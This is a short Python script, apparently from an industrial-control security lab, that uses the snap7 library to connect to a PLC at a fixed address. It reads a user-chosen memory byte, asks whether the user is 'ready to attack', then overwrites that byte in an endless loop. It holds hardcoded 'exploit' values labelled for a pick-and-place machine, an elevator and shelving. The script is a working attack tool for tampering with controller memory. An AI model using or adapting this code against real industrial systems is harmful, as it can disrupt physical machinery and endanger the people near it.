import sys
import snap7
from snap7.util import *
from snap7.types import *
from contextlib import suppress
import time
import threading

plc = snap7.client.Client()
plc.connect("192.168.0.1", 0, 1)

def inputFail(input) -> int:
    try:
        valByte = int(input)
        if(valByte < 0 or valByte > 65525):
            raise ValueError
    except ValueError:
        print("Please enter a byte from 0-65,525.")
        sys.exit()
    return(valByte)

def whichDataType(input) -> bool:
    try:
        if str(input) == "i":
            floatNotInt = False
        elif str(input) == "f":
            floatNotInt = True
        else:
            raise ValueError
    except ValueError:
        print("Enter an appropriate datatype")
        sys.exit()
    return(floatNotInt)

startByte = inputFail(input("Which Byte do you want to interfere with? \n"))
floatNotInt = whichDataType(input("Which data type is the byte you are targeting?"))
# PE = 0x81 -> Inputs
# PA = 0x82 -> Outputs
# MK = 0x83 -> Memorys
# DB = 0x84 -> Database
# CT = 0x1C -> Counter
# TM = 0x1D -> Timer
    
area = snap7.types.Areas.MK
floatAndDIntSize = 4
intSize = 2
valueForPPMachine = bytearray(b'\x41\x3C\xCC\xCC')
valueForElevator = bytearray(b'\x40\xA0\x00\x00')
valueForShelving = bytearray(b'\x00\x00\x00\x0A')
ValueForElevInput = bytearray(b'\x41\xA0\x00\x00')
ValueForItemExploit = bytearray(b'\x00\x02')
ValueForRowExploit = bytearray(b'\x00\x01')


print(valueForPPMachine)
if(floatNotInt):
    readBytes = plc.read_area(area, 0, startByte, floatAndDIntSize)
elif(floatNotInt == False):
    readBytes = plc.read_area(area, 0, startByte, intSize)

print(f"Overall Byte value is: {readBytes}")

ready = input("Have you noted this down and are ready to attack? press y if ready")

if(str(ready) != "y"):
    sys.exit()
else:
    while True:
        plc.write_area(area, 0, startByte, ValueForRowExploit)